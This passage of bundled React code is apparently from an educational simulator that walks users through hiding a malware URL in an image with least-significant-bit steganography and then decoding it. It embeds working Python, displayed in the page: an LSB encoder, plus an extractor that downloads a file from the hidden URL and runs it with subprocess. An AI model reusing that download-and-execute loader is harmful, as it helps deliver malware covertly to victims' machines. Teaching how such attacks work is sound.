dt.svg`
  animation: ${$5819da83a926266a$var$spin} 0.75s steps(12, end) infinite;
  animation-duration: 0.75s;
`;
dt.polyline`
  stroke-width: ${(i) => i.width}px;
  stroke-linecap: round;

  &:nth-child(12n + 0) {
    stroke-opacity: 0.08;
  }

  &:nth-child(12n + 1) {
    stroke-opacity: 0.17;
  }

  &:nth-child(12n + 2) {
    stroke-opacity: 0.25;
  }

  &:nth-child(12n + 3) {
    stroke-opacity: 0.33;
  }

  &:nth-child(12n + 4) {
    stroke-opacity: 0.42;
  }

  &:nth-child(12n + 5) {
    stroke-opacity: 0.5;
  }

  &:nth-child(12n + 6) {
    stroke-opacity: 0.58;
  }

  &:nth-child(12n + 7) {
    stroke-opacity: 0.66;
  }

  &:nth-child(12n + 8) {
    stroke-opacity: 0.75;
  }

  &:nth-child(12n + 9) {
    stroke-opacity: 0.83;
  }

  &:nth-child(12n + 11) {
    stroke-opacity: 0.92;
  }
`;
const $afa12dd3e98f740f$var$dash = mt`
to {
   stroke-dashoffset: 136;
 }
`;
dt.polygon`
  stroke-dasharray: 17;
  animation: ${$afa12dd3e98f740f$var$dash} 2.5s cubic-bezier(0.35, 0.04, 0.63, 0.95) infinite;
`;
dt.svg`
  transform-origin: 50% 65%;
`;
const Loader = () =>
    jsxRuntimeExports.jsxs("div", {
      style: {
        display: "flex",
        justifyContent: "center",
        flexDirection: "column",
        width: "100%",
        alignItems: "center",
        height: "100%",
      },
      children: [
        jsxRuntimeExports.jsx($ad60b992c945fdb5$export$8009d4483dfda42, {
          visible: !0,
          width: "200",
          color: "#4fa94d",
          ariaLabel: "infinity-spin-loading",
        }),
        jsxRuntimeExports.jsx("h5", {
          style: { color: "green", margin: 1 },
          children: "Compiling",
        }),
      ],
    }),
  CodeEditor = ({ isDecode: i, dataForCompile: a }) => {
    const o = reactExports.useRef(null);
    useDispatch();
    const { executiveLine: s, onDecode: tt } = useSelector((St) => St.exp),
      [nt, ot] = reactExports.useState(!1);
    reactExports.useEffect(() => {
      if (
        (s === "" && ot(!1),
        s === "exp-one" || s === "exp-two" || s === "exp-three")
      ) {
        ot(!0);
        const St = setTimeout(() => {
          ot(!1);
        }, 5e3);
        return () => clearTimeout(St);
      }
    }, [s]);
    const st = (St) => (St === s && nt ? "exe-blink" : St),
      ft = `
<pre>
<span class="keyword">import</span> numpy as np
<span class="keyword">from</span> PIL <span class="keyword">import</span> Image

<span class="keyword">class</span> HideStage2Payload:

    <span class="keyword">def</span> __init__(self):
        <span class="keyword">pass</span>

    <span class="keyword">def</span> encode_url(self, src_image, message, output_image):

        image_mode = {'3': 'RGB', '4': 'RGBA'}

        img = Image.open(src_image, 'r')

        <span class="keyword">if</span> img.format != 'PNG':
            <span class="keyword">print</span>('Only PNG images are supported, given format is:', img.format)
            <span class="keyword">return</span>

        width, height = img.size
        array = np.array(list(img.getdata()))

        <span class="keyword">if</span> img.mode == 'RGB':
            n = 3
        <span class="keyword">elif</span> img.mode == 'RGBA':
            n = 4
        <span class="keyword">print</span>('Image mode is:', image_mode[str(n)])

        total_pixels = array.size / 4

        message += '$t3g0'
        b_message = ''.join([<span class="keyword">format</span>(ord(i), '08b') <span class="keyword">for</span> i <span class="keyword">in</span> message])
        req_pixels = len(b_message)

        <span class="keyword">if</span> req_pixels > total_pixels:
            <span class="keyword">print</span>('Need a bigger size image!')
            <span class="keyword">return</span> <span class="keyword">None</span>
        <span class="keyword">else</span>:
            index = 0
            <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="keyword">int</span>(total_pixels)):
                <span class="keyword">for</span> q <span class="keyword">in</span> range(0, 3):
                    <span class="keyword">if</span> index < req_pixels:
                        array[p][q] = <span class="keyword">int</span>(bin(array[p][q])[2:9] + b_message[index], 2)
                        index += 1

            array = array.reshape(height, width, n)
            enc_img = Image.fromarray(array.astype('uint8'), img.mode)
            enc_img.save(output_image)
            <span class="keyword">print</span>('Image encoded successfully!')
            <span class="keyword">return</span> total_pixels


<span class="keyword">if</span> __name__ == "__main__":

    decoy_original = ${a[0] || ""}
    decoy_image_output = ${a[0] || ""}
    payload_url = ${a[1] || ""}
    obj = HideStage2Payload()
    obj.encode_url(decoy_original, payload_url, decoy_image_output)
</pre>
  `,
      ht = `
<pre>
<span class="keyword">import</span> numpy as np
<span class="keyword">from</span> PIL <span class="keyword">import</span> Image
<span class="keyword">from</span> requests <span class="keyword">import</span> get
<span class="keyword">from</span> subprocess <span class="keyword">import</span> run


<span class="keyword">class</span> ExtractStage2Source:

    <span class="keyword">def</span> __init__(self):
        <span class="keyword">pass</span>

    <span class="keyword">def</span> <span class="${st(
      "exp-one"
    )} extract-lsb-payload-url">extract_lsb_payload_url(self, decoy_image):</span>

        hidden_bits = message = ''
        img = Image.open(decoy_image, 'r')

        <span class="keyword">if</span> img.format != 'PNG':
            <span class="keyword">print</span>('Only PNG images are supported! Entered image format is:', img.format)
            <span class="keyword">return</span>

        array = np.array(list(img.getdata()))

        <span class="keyword">if</span> img.mode == 'RGB':
            n = 3
        <span class="keyword">elif</span> img.mode == 'RGBA':
            n = 4

        total_pixels = array.size/4

        <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="keyword">int</span>(total_pixels)):
            <span class="keyword">for</span> q <span class="keyword">in</span> range(0, 3):
                hidden_bits += (bin(array[p][q])[2:][-1])

        hidden_bits = [hidden_bits[i:i+8] <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(hidden_bits), 8)]

        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(hidden_bits)):
            <span class="keyword">if</span> message[-5:] == '$t3g0':
                <span class="keyword">break</span>
            <span class="keyword">else</span>:
                message += <span class="keyword">chr</span>(<span class="keyword">int</span>(hidden_bits[i], 2))

        <span class="keyword">if</span> '$t3g0' <span class="keyword">in</span> message:
            <span class="keyword">print</span>('Payload URL Extracted:', message[:-5])
        <span class="keyword">else</span>:
            <span class="keyword">print</span>('message not found!')

    <span class="keyword">def</span> <span class="${st(
      "exp-two"
    )} download-malware"> download_malware(self, payload_url):</span>
        filename = r'media_files\\malwr.exe'
        <span class="keyword">with</span> <span class="keyword">open</span>(filename, "wb") <span class="keyword">as</span> file:
            response = get(payload_url)
            file.write(response.content)
            file.close()
            <span class="keyword">return</span> filename

    <span class="keyword">def</span><span class="${st(
      "exp-three"
    )} execute-malware"> execute_malware(self, binname, payload_path):</span>
        run([binname, payload_path])
</pre>
  `,
      gt = i ? ht : ft;
    return (
      reactExports.useEffect(() => {
        o.current &&
          (tt
            ? (o.current.scrollTop = 0)
            : (o.current.scrollTop = o.current.scrollHeight));
      }, [gt, tt]),
      jsxRuntimeExports.jsxs("div", {
        style: {
          width: "100%",
          height: "100%",
          backgroundColor: "#282c34",
          color: "#abb2bf",
          padding: 0,
          fontFamily: "monospace",
          whiteSpace: "pre-wrap",
          overflow: "auto",
          margin: 0,
        },
        ref: o,
        id: "scroll",
        children: [
          jsxRuntimeExports.jsx("div", {
            dangerouslySetInnerHTML: { __html: gt },
            style: { width: "100%", height: "100%" },
          }),
          jsxRuntimeExports.jsx("style", {
            children: `
          .keyword {
            color: #9dca0d;
            font-size: 15px;
          }
          .exe-blink {
            animation: blink 1s step-start infinite;
            background-color: red;
            color: white;
            font-weight: 800;
          }
          @keyframes blink {
            0% { background-color: red; }
            50% { background-color: transparent; }
            100% { background-color: red; }
          }
        `,
          }),
        ],
      })
    );
  },
  malware = "images/window-B6alTuWr.jpg",
  ExeFileComponent = ({
    isDownload: i,
    isLoading: a,
    isExecute: o,
    onExecute: s,
  }) => {
    const { executiveLine: tt } = useSelector((nt) => nt.exp);
    return jsxRuntimeExports.jsxs("div", {
      style: {
        background: "black",
        borderRadius: 5,
        width: "400px",
        height: "250px",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        position: "relative",
      },
      children: [
        jsxRuntimeExports.jsxs("div", {
          style: {
            width: "92%",
            height: "92%",
            background: "white",
            position: "relative",
          },
          children: [
            jsxRuntimeExports.jsx("img", {
              src: malware,
              style: { width: "100%", height: "100%" },
              alt: "window",
            }),
            i &&
              !o &&
              a &&
              jsxRuntimeExports.jsxs("div", {
                style: {
                  position: "absolute",
                  top: 75,
                  display: "flex",
                  justifyContent: "center",
                  width: "100%",
                  background: "white",
                },
                children: [
                  jsxRuntimeExports.jsx(RefIcon, {
                    style: { color: "black", marginRight: 5 },
                  }),
                  jsxRuntimeExports.jsx("h4", {
                    style: { color: "black", fontWeight: 700, fontsize: 15 },
                    children: "Downloading...",
                  }),
                ],
              }),
          ],
        }),
        i &&
          !o &&
          !a &&
          tt === "exp-two" &&
          jsxRuntimeExports.jsxs("div", {
            style: {
              position: "absolute",
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              width: 90,
              padding: 5,
              cursor: "pointer",
            },
            onClick: s,
            className: "exeBlinking",
            children: [
              jsxRuntimeExports.jsxs("div", {
                style: {
                  width: 50,
                  height: 50,
                  background: "white",
                  border: "4px solid grey",
                  borderRadius: 4,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                },
                children: [
                  jsxRuntimeExports.jsx("div", {
                    style: {
                      flex: 0.4,
                      borderRight: "2px solid grey",
                      height: "100%",
                      marginLeft: 5,
                    },
                    children: "- -",
                  }),
                  jsxRuntimeExports.jsx("div", {
                    style: {
                      flex: 0.6,
                      background: "skyblue",
                      width: "70%",
                      height: "80%",
                      marginInline: 5,
                    },
                  }),
                ],
              }),
              jsxRuntimeExports.jsx("h6", {
                style: {
                  color: "black",
                  margin: 0,
                  fontsize: 8,
                  width: "auto",
                },
                children: "malicious.exe",
              }),
              jsxRuntimeExports.jsx("h6", {
                style: {
                  color: "black",
                  margin: 0,
                  fontsize: 8,
                  width: "100%",
                  background: "white",
                  textAlign: "center",
                },
                children: "Execute",
              }),
            ],
          }),
        o &&
          tt === "exp-three" &&
          jsxRuntimeExports.jsxs("div", {
            style: {
              position: "absolute",
              width: "80%",
              height: "80%",
              background: "black",
              flex: 1,
            },
            children: [
              jsxRuntimeExports.jsx("div", {
                style: {
                  flex: 0.2,
                  display: "flex",
                  justifyContent: "center",
                  background: "#262626",
                },
                children: jsxRuntimeExports.jsx("h6", {
                  style: { margin: 5, color: "white", fontSize: 10 },
                  children: "Malicious.exe",
                }),
              }),
              jsxRuntimeExports.jsxs("div", {
                style: {
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  flex: 0.8,
                  justifyContent: "center",
                  height: "100%",
                },
                children: [
                  jsxRuntimeExports.jsx(RefIcon$3, { style: { color: "red" } }),
                  jsxRuntimeExports.jsx("h6", {
                    style: { margin: 1, color: "red" },
                    children: "Malicious detected",
                  }),
                ],
              }),
            ],
          }),
        jsxRuntimeExports.jsx("div", {
          style: {
            width: 34,
            height: 50,
            position: "absolute",
            bottom: 0,
            top: 240,
            background: "black",
          },
        }),
        jsxRuntimeExports.jsx("div", {
          style: {
            width: 254,
            height: 10,
            position: "absolute",
            bottom: 0,
            top: 280,
            background: "black",
          },
        }),
      ],
    });
  },
  DecodeSimulation = ({ binaryArr: i, dataForCompile: a }) => {
    const { executiveLine: o } = useSelector((_t) => _t.exp),
      [s, tt] = reactExports.useState(!0),
      [nt, ot] = reactExports.useState(!1),
      [st, ft] = reactExports.useState(!1),
      ht = useDispatch();
    reactExports.useEffect(() => {
      let _t;
      return (
        o === "exp-one" &&
          (tt(!0),
          (_t = setTimeout(() => {
            tt(!1), ht(updateOnDecode(!1));
          }, 6e3))),
        o === "exp-two" &&
          (tt(!0),
          ft(!1),
          (_t = setTimeout(() => {
            tt(!1),
              ht(
                updateSteps(
                  "Click “Run Exe” to run the Stage 2 Malware using the malicious Python Code."
                )
              );
          }, 6e3))),
        o === "exp-three" &&
          (tt(!0),
          (_t = setTimeout(() => {
            tt(!1);
          }, 6e3))),
        () => clearTimeout(_t)
      );
    }, [o, ht]);
    const gt = () => {
        ht(updateExecutiveLine("exp-one")), ht(updateOnDecode(!0));
      },
      St = () => {
        ot(!0), ht(updateExecutiveLine("exp-two"));
      },
      vt = () => {
        ft(!0), ht(updateExecutiveLine("exp-three"));
      };
    return (
      console.log(o),
      jsxRuntimeExports.jsx("div", {
        style: {
          width: "100%",
          height: "100%",
          display: "flex",
          flexDirection: "column",
          justifyContent: "center",
          paddingBlock: 10,
        },
        children: jsxRuntimeExports.jsx("div", {
          style: {
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            flex: 0.4,
          },
          children:
            o === ""
              ? jsxRuntimeExports.jsx(Button, {
                  onClick: gt,
                  children: "Decode Image",
                })
              : nt
              ? jsxRuntimeExports.jsx("div", {
                  style: {
                    width: "100%",
                    height: "100%",
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    flexDirection: "column",
                  },
                  children: jsxRuntimeExports.jsx(ExeFileComponent, {
                    isDownload: nt,
                    isExecute: st,
                    isLoading: s,
                    onExecute: vt,
                  }),
                })
              : jsxRuntimeExports.jsxs("div", {
                  style: {
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                  },
                  children: [
                    s && o === "exp-one"
                      ? jsxRuntimeExports.jsx("h5", {
                          style: { color: "white" },
                          children: "Converting Binary...",
                        })
                      : o !== "exp-three" &&
                        jsxRuntimeExports.jsxs("div", {
                          style: {
                            display: "flex",
                            width: "70%",
                            flexWrap: "wrap",
                            margin: 5,
                          },
                          children: [
                            jsxRuntimeExports.jsx("h5", {
                              style: {
                                textAlign: "center",
                                width: "100%",
                                color: "white",
                              },
                              children: "Binary",
                            }),
                            i == null
                              ? void 0
                              : i.map((_t, Et) =>
                                  _t.map((Ct, Pt) =>
                                    jsxRuntimeExports.jsx(
                                      "div",
                                      {
                                        style: {
                                          width: 15,
                                          height: 20,
                                          background: "red",
                                          margin: 1.5,
                                        },
                                        children: jsxRuntimeExports.jsx("h5", {
                                          style: {
                                            margin: 0,
                                            fontSize: 14,
                                            textAlign: "center",
                                          },
                                          children: Ct,
                                        }),
                                      },
                                      Pt
                                    )
                                  )
                                ),
                            jsxRuntimeExports.jsxs("div", {
                              style: {
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                width: "100%",
                              },
                              children: [
                                jsxRuntimeExports.jsx("h5", {
                                  style: { fontSize: 18, color: "white" },
                                  children: "ASCII :",
                                }),
                                jsxRuntimeExports.jsx("h5", {
                                  style: { fontSize: 16, color: "green" },
                                  children: a[1],
                                }),
                              ],
                            }),
                            jsxRuntimeExports.jsx(Button, {
                              onClick: St,
                              children: "Download Malware",
                            }),
                          ],
                        }),
                    o === "exp-one" &&
                      s &&
                      jsxRuntimeExports.jsxs("div", {
                        style: {
                          display: "flex",
                          height: "100%",
                          flexDirection: "column",
                          justifyContent: "center",
                          alignItems: "center",
                          flex: 1,
                        },
                        children: [
                          jsxRuntimeExports.jsx(Byte, {
                            isZero: !0,
                            isChange: !0,
                          }),
                          jsxRuntimeExports.jsx(Byte, {
                            isZero: !0,
                            pixel: "Green",
                            isChange: !0,
                          }),
                          jsxRuntimeExports.jsx(Byte, {
                            pixel: "Blue",
                            isChange: !0,
                          }),
                        ],
                      }),
                  ],
                }),
        }),
      })
    );
  },
  urlData = [{ id: 1, title: "https://admin.com/malicious.exe" }],
  stringToBinary = (i) =>
    i
      .split("")
      .map((a) => a.charCodeAt(0).toString(2).padStart(8, "0"))
      .join(" "),
  splitBinaryString = (i) => {
    let a = "",
      o = [];
    for (let nt of i) nt !== " " && (a += nt);
    const s = a.split("");
    let tt = [];
    for (let nt = 0; nt < s.length; nt++)
      tt.push(s[nt]),
        ((nt + 1) % 3 === 0 || nt === s.length - 1) && (o.push(tt), (tt = []));
    return o;
  },
  UserSimulation = () => {
    const i = useDispatch(),
      [a, o] = reactExports.useState({
        dragStarted: !1,
        dataForCompile: [],
        isCompile: !1,
        binaryArr: [],
        viewedIndex: [],
        showImage: !1,
        showModified: !1,
        isDecode: !1,
      }),
      {
        openCode: s,
        dropSteps: tt,
        isImageCompiled: nt,
        isUrlCompiled: ot,
        isEncoder: st,
      } = useSelector((It) => It.exp),
      {
        dragStarted: ft,
        dataForCompile: ht,
        isCompile: gt,
        binaryArr: St,
        viewedIndex: vt,
        showImage: _t,
        showModified: Et,
        isDecode: Ct,
      } = a,
      Pt = () => {
        i(updateOpenCode(!s));
      },
      bt = () => {
        o((It) => ({ ...It, dragStarted: !1 }));
      },
      xt = (It) => {
        It.preventDefault();
        const Ot = JSON.parse(It.dataTransfer.getData("item"));
        ht.length === 0 &&
          i(
            updateSteps(
              "Drag and drop the malware’s URL into the “Python Input Box”. "
            )
          ),
          ht.length === 1 &&
            i(
              updateSteps(
                "Click “Encode” to hide the malware’s URL into the selected image using LSB technique. "
              )
            ),
          o((Nt) => ({
            ...Nt,
            dragStarted: !1,
            dataForCompile: [...Nt.dataForCompile, Ot.title || Ot],
            isCompile: !0,
          }));
      },
      yt = (It) => {
        It.preventDefault();
      };
    reactExports.useEffect(() => {
      let It;
      return (
        ht.length === 1 &&
          (It = setTimeout(() => {
            i(updateCompiledImage(!0)), o((Ot) => ({ ...Ot, isCompile: !1 }));
          }, 2e3)),
        () => {
          clearTimeout(It);
        }
      );
    }, [ht, i]),
      reactExports.useEffect(() => {
        let It;
        if (ht.length === 2 && nt) {
          const Ot = stringToBinary(ht[1]);
          It = setTimeout(() => {
            i(updateCompiledUrl(!0)),
              o((Nt) => ({
                ...Nt,
                isCompile: !1,
                binaryArr: splitBinaryString(Ot),
              }));
          }, 2e3);
        }
        return () => {
          clearTimeout(It);
        };
      }, [ht, nt, i]),
      reactExports.useEffect(() => {
        let It,
          Ot = 0,
          Nt = 3,
          zt;
        return (
          st &&
            ((It = setTimeout(() => {
              i(updateIsEncoder(!1)),
                i(
                  updateSteps(
                    "Click “Show Image” to see the modified image. The changes are not noticeable."
                  )
                ),
                o((Bt) => ({ ...Bt, showImage: !0 }));
            }, Math.ceil(St.length / 3) * 700)),
            (zt = setInterval(() => {
              o((Bt) => {
                const Wt = [0, 1, 2];
                for (let Gt = Ot; Gt < Nt && Gt < St.length; Gt++) Wt.push(Gt);
                return { ...Bt, viewedIndex: [...Bt.viewedIndex, ...Wt] };
              }),
                (Ot = Nt),
                (Nt = Ot + 3);
            }, 690))),
          () => {
            clearTimeout(It), clearInterval(zt);
          }
        );
      }, [st, i, St]);
    const wt = () => {
        i(updateIsEncoder(!0));
      },
      $t = () => {
        o((It) => ({ ...It, showModified: !Et })),
          i(
            updateSteps("Click “Next Step” to proceed with the Decoding step.")
          );
      },
      kt = () => {
        o((It) => ({ ...It, isDecode: !0 })),
          i(
            updateSteps(
              "Click “Decoding Image” to see how the malicious Python code will extract the URL hidden in the LSB of the selected image and download it to the PC."
            )
          );
      },
      Rt = () => {
        i(updateRsetSimulation()),
          o((It) => ({
            ...It,
            dragStarted: !1,
            dataForCompile: [],
            isCompile: !1,
            binaryArr: [],
            viewedIndex: [],
            showImage: !1,
            showModified: !1,
            isDecode: !1,
          })),
          i(updateClearSteps()),
          i(
            updateSteps(
              "Info: You may check the code used to simulate this experiment by clicking the “terminal” icon on the top right corner of the “Python Input Box”."
            )
          ),
          i(
            updateSteps(
              "Drag and drop an image to “Python Input Box”. This image will be used to hide malware’s URL."
            )
          );
      };
    return jsxRuntimeExports.jsxs("div", {
      style: {
        width: "100%",
        height: "100%",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        flex: 1,
        position: "relative",
      },
      children: [
        jsxRuntimeExports.jsxs("div", {
          style: {
            position: "absolute",
            top: 5,
            left: 10,
            display: "flex",
            alignItems: "center",
            marginBlock: 10,
          },
          children: [
            jsxRuntimeExports.jsx(RefIcon$1, {
              onClick: () => {
                i(updateCheckedValue(2)),
                  Rt(),
                  i(updateClearSteps()),
                  i(
                    updateSteps(
                      "Shows the bit level details of the original image and the modified image after inserting the message."
                    )
                  ),
                  i(
                    updateSteps(
                      "Press Unhide Text to extract the hidden message."
                    )
                  );
              },
              style: { fontSize: 30, color: "white" },
            }),
            jsxRuntimeExports.jsx(Button, {
              onClick: Rt,
              style: { marginLeft: 5, height: 30 },
              children: "Reset",
            }),
          ],
        }),
        jsxRuntimeExports.jsx("div", {
          style: {
            flex: 0.9,
            width: "100%",
            height: "100%",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            maxHeight: "90%",
          },
          children: jsxRuntimeExports.jsxs("div", {
            style: {
              width: "100%",
              background: "transparent",
              height: "90%",
              boxShadow: "green 0px 5px 15px",
              borderRadius: 20,
              padding: 10,
              display: "flex",
              flex: 0.9,
              justifyContent: "space-between",
            },
            children: [
              jsxRuntimeExports.jsxs("div", {
                style: {
                  flex: 0.49,
                  display: "flex",
                  borderRadius: 20,
                  flexDirection: "column",
                  justifyContent: "space-between",
                },
                children: [
                  St.length === 0 &&
                    jsxRuntimeExports.jsx("div", {
                      style: {
                        boxShadow: "green 0px 5px 15px",
                        flex: 0.4,
                        borderRadius: 20,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        flexDirection: "column",
                      },
                      children: jsxRuntimeExports.jsxs("div", {
                        style: {
                          display: "flex",
                          flexDirection: "column",
                          width: "100%",
                          justifyContent: "space-between",
                          flex: 1,
                        },
                        children: [
                          jsxRuntimeExports.jsx("div", {
                            style: {
                              height: 40,
                              background: "white",
                              borderTopLeftRadius: 20,
                              borderTopRightRadius: 20,
                              flex: 0.1,
                            },
                            children: jsxRuntimeExports.jsxs("h4", {
                              style: {
                                textAlign: "center",
                                margin: 1,
                                color: "black",
                              },
                              children: ["Drag the ", nt ? "URL" : "Image"],
                            }),
                          }),
                          jsxRuntimeExports.jsxs("div", {
                            style: {
                              display: "flex",
                              flex: 0.7,
                              justifyContent: "center",
                            },
                            children: [
                              nt &&
                                !ot &&
                                jsxRuntimeExports.jsx("div", {
                                  style: {
                                    display: "flex",
                                    flexDirection: "column",
                                  },
                                  children: urlData.map((It) =>
                                    jsxRuntimeExports.jsx(
                                      "div",
                                      {
                                        style: {
                                          width: "300px",
                                          height: 40,
                                          background: "white",
                                          borderRadius: 30,
                                          padding: 10,
                                          color: "black",
                                          boxShadow: "green 0px 5px 15px",
                                          marginInline: 5,
                                          cursor: "grabbing",
                                          marginBlock: 10,
                                        },
                                        draggable: !0,
                                        onDragStart: (Ot) =>
                                          Ot.dataTransfer.setData(
                                            "item",
                                            JSON.stringify(It)
                                          ),
                                        onDragEnd: bt,
                                        children: jsxRuntimeExports.jsx("h5", {
                                          style: { margin: 0 },
                                          children: It.title,
                                        }),
                                      },
                                      It.id
                                    )
                                  ),
                                }),
                              !nt &&
                                !ot &&
                                listImages.map((It, Ot) =>
                                  jsxRuntimeExports.jsx(
                                    "div",
                                    {
                                      style: {
                                        width: 150,
                                        height: 150,
                                        marginInline: 15,
                                        cursor: "grabbing",
                                      },
                                      children: jsxRuntimeExports.jsx("img", {
                                        style: {
                                          width: "100%",
                                          height: "100%",
                                          marginInline: 15,
                                        },
                                        src: It,
                                        alt: "image",
                                        draggable: !0,
                                        onDragStart: (Nt) =>
                                          Nt.dataTransfer.setData(
                                            "item",
                                            JSON.stringify(It)
                                          ),
                                        onDragEnd: bt,
                                      }),
                                    },
                                    Ot
                                  )
                                ),
                              nt &&
                                ot &&
                                jsxRuntimeExports.jsx("h5", {
                                  children: "No data",
                                }),
                            ],
                          }),
                        ],
                      }),
                    }),
                  jsxRuntimeExports.jsxs("div", {
                    style: {
                      boxShadow: "green 0px 5px 15px",
                      flex: St.length === 0 ? 0.58 : 1,
                      borderRadius: 20,
                      display: "flex",
                      flexDirection: "column",
                      justifyContent: "space-between",
                      maxWidth: "100%",
                    },
                    children: [
                      jsxRuntimeExports.jsx("div", {
                        style: {
                          height: 40,
                          background: "white",
                          borderTopLeftRadius: 20,
                          borderTopRightRadius: 20,
                        },
                        children: jsxRuntimeExports.jsx("h4", {
                          style: {
                            textAlign: "center",
                            margin: 1,
                            color: "black",
                          },
                          children: "Output",
                        }),
                      }),
                      Ct
                        ? jsxRuntimeExports.jsx(DecodeSimulation, {
                            binaryArr: St,
                            dataForCompile: ht,
                          })
                        : gt
                        ? jsxRuntimeExports.jsx(Loader, {})
                        : jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, {
                            children: [
                              Et
                                ? jsxRuntimeExports.jsxs("div", {
                                    style: {
                                      display: "flex",
                                      alignItems: "center",
                                      flexDirection: "column",
                                      justifyContent: "center",
                                    },
                                    children: [
                                      jsxRuntimeExports.jsx("img", {
                                        style: { width: "80%", height: "100%" },
                                        src: ht[0],
                                      }),
                                      jsxRuntimeExports.jsx("div", {
                                        style: { display: "flex" },
                                        children: jsxRuntimeExports.jsx(
                                          Tooltip,
                                          {
                                            title: "Decode",
                                            children: jsxRuntimeExports.jsx(
                                              Button,
                                              {
                                                onClick: kt,
                                                style: {
                                                  marginTop: 10,
                                                  outline: "none",
                                                },
                                                children: "Next step",
                                              }
                                            ),
                                          }
                                        ),
                                      }),
                                    ],
                                  })
                                : jsxRuntimeExports.jsxs(
                                    jsxRuntimeExports.Fragment,
                                    {
                                      children: [
                                        ot &&
                                          jsxRuntimeExports.jsxs("div", {
                                            style: {
                                              flex: 0.49,
                                              display: "flex",
                                              alignItems: "center",
                                              justifyContent: "center",
                                              flexDirection: "column",
                                            },
                                            children: [
                                              jsxRuntimeExports.jsx("h4", {
                                                style: { color: "whitesmoke" },
                                                children: "URL binary",
                                              }),
                                              jsxRuntimeExports.jsx("div", {
                                                style: {
                                                  display: "flex",
                                                  width: "450px",
                                                  flexWrap: "wrap",
                                                },
                                                children: St.map((It, Ot) =>
                                                  It.map((Nt, zt) =>
                                                    jsxRuntimeExports.jsx(
                                                      "div",
                                                      {
                                                        style: {
                                                          width: 15,
                                                          height: 20,
                                                          background:
                                                            vt.includes(Ot)
                                                              ? "red"
                                                              : "grey",
                                                          margin: 1.5,
                                                        },
                                                        children:
                                                          jsxRuntimeExports.jsx(
                                                            "h5",
                                                            {
                                                              style: {
                                                                margin: 0,
                                                                fontSize: 14,
                                                                textAlign:
                                                                  "center",
                                                              },
                                                              children: Nt,
                                                            }
                                                          ),
                                                      },
                                                      zt
                                                    )
                                                  )
                                                ),
                                              }),
                                            ],
                                          }),
                                        nt &&
                                          jsxRuntimeExports.jsxs("div", {
                                            style: {
                                              flex: 0.49,
                                              display: "flex",
                                              alignItems: "center",
                                              justifyContent: "center",
                                              flexDirection: "column",
                                              height: "100%",
                                            },
                                            children: [
                                              jsxRuntimeExports.jsx("h4", {
                                                style: { color: "white" },
                                                children: "Image pixels",
                                              }),
                                              jsxRuntimeExports.jsxs("div", {
                                                style: {
                                                  flex: 0.49,
                                                  display: "flex",
                                                  alignItems: "center",
                                                  justifyContent: "center",
                                                  height: "100%",
                                                },
                                                children: [
                                                  jsxRuntimeExports.jsx(Byte, {
                                                    isZero: !0,
                                                    isChange: st,
                                                  }),
                                                  jsxRuntimeExports.jsx(Byte, {
                                                    isZero: !0,
                                                    pixel: "Green",
                                                    isChange: st,
                                                  }),
                                                  jsxRuntimeExports.jsx(Byte, {
                                                    pixel: "Blue",
                                                    isChange: st,
                                                  }),
                                                ],
                                              }),
                                            ],
                                          }),
                                        " ",
                                      ],
                                    }
                                  ),
                              _t &&
                                !Ct &&
                                jsxRuntimeExports.jsxs(Button, {
                                  onClick: $t,
                                  children: [Et ? "Hide" : "Show", " Image"],
                                }),
                              ht.length === 0 &&
                                !nt &&
                                jsxRuntimeExports.jsx("div", {
                                  style: {
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center",
                                    height: "100%",
                                  },
                                  children: jsxRuntimeExports.jsx("h5", {
                                    children: "No output",
                                  }),
                                }),
                            ],
                          }),
                    ],
                  }),
                ],
              }),
              jsxRuntimeExports.jsxs("div", {
                className: ft ? "blinking" : "",
                style: {
                  flex: 0.49,
                  boxShadow: "green 0px 5px 15px",
                  borderRadius: 20,
                  width: "100%",
                  display: "flex",
                  flexDirection: "column",
                  maxWidth: "50%",
                },
                children: [
                  jsxRuntimeExports.jsxs("div", {
                    style: {
                      width: "100%",
                      height: 40,
                      background: "white",
                      borderTopLeftRadius: 20,
                      borderTopRightRadius: 20,
                      flex: 0.05,
                      display: "flex",
                      alignItems: "center",
                    },
                    children: [
                      jsxRuntimeExports.jsx("h4", {
                        style: {
                          textAlign: "end",
                          color: "black",
                          margin: 0,
                          flex: 0.6,
                        },
                        children: "Python Input Box",
                      }),
                      jsxRuntimeExports.jsx("div", {
                        style: {
                          flex: 0.4,
                          display: "flex",
                          justifyContent: "flex-end",
                          marginRight: 15,
                        },
                        children: jsxRuntimeExports.jsx(Tooltip, {
                          title: "Code",
                          children: jsxRuntimeExports.jsx(RefIcon$2, {
                            onClick: Pt,
                            style: { fontSize: 20, color: "black" },
                          }),
                        }),
                      }),
                    ],
                  }),
                  jsxRuntimeExports.jsxs("div", {
                    style: {
                      flex: 1,
                      display: "flex",
                      height: "100%",
                      flexDirection: "column",
                      overflow: "hidden",
                    },
                    children: [
                      s || Ct
                        ? jsxRuntimeExports.jsx(CodeEditor, {
                            isDecode: Ct,
                            dataForCompile: ht,
                          })
                        : jsxRuntimeExports.jsxs("div", {
                            style: {
                              display: "flex",
                              flexDirection: "column",
                              justifyContent: "center",
                              alignItems: "center",
                              flex: 1,
                              height: "100%",
                              width: "100%",
                            },
                            onDrop: xt,
                            onDragOver: yt,
                            children: [
                              ht.length === 0 &&
                                jsxRuntimeExports.jsxs("h3", {
                                  className: ft ? "letterblink" : "",
                                  children: ["Drop the ", nt ? "URL" : "Image"],
                                }),
                              ht.map((It, Ot) =>
                                jsxRuntimeExports.jsx(
                                  React$1.Fragment,
                                  {
                                    children:
                                      Ot === 0
                                        ? jsxRuntimeExports.jsx("img", {
                                            style: { width: 200, height: 200 },
